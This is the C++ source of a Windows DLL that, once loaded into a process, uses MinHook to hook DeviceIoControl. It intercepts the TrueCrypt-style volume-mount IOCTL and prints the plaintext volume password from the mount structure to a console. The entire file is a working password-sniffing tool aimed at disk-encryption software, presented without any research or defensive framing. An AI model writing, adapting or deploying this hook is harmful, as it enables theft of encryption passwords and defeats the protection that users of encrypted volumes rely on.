#include "stdafx.h"
#include <Windows.h>
#include <cstdio>
#include <winioctl.h>
#include "MinHook\include\MinHook.h"

#define TC_IOCTL(CODE) (CTL_CODE (FILE_DEVICE_UNKNOWN, 0x800 + (CODE), METHOD_BUFFERED, FILE_ANY_ACCESS))
#define TC_IOCTL_MOUNT_VOLUME							TC_IOCTL (3)

typedef BOOL(WINAPI* DeviceIoControl_t)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
DeviceIoControl_t phookDeviceIoControl;

BOOL WINAPI hookDeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped) {
	if (dwIoControlCode == TC_IOCTL_MOUNT_VOLUME && lpInBuffer) {
		MOUNT_STRUCT* pmount = (MOUNT_STRUCT*)lpInBuffer;
		unsigned char* password = pmount->VolumePassword.Text;
		printf("Password: %s\n", password);
	}

	return phookDeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped);
}

int init() {
	AllocConsole();
	freopen("CONOUT$", "w", stdout);

	MH_STATUS status = MH_Initialize();

	if (status != MH_OK) {
		printf("Failed to initialize MinHook!\n");
		return 0;
	}

	status = MH_CreateHook(&DeviceIoControl, &hookDeviceIoControl, reinterpret_cast<LPVOID*>(&phookDeviceIoControl));

	if (status != MH_OK) {
		printf("Failed to create DeviceIoControl hook!\n");
		return 0;
	}

	status = MH_EnableHook(&DeviceIoControl);

	if (status != MH_OK) {
		printf("Failed to enable DeviceIoControl hook!\n");
		return 0;
	}

	printf("Hooks initialized successfully!\n");

	return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return init();
		break;
	}
	return TRUE;
}

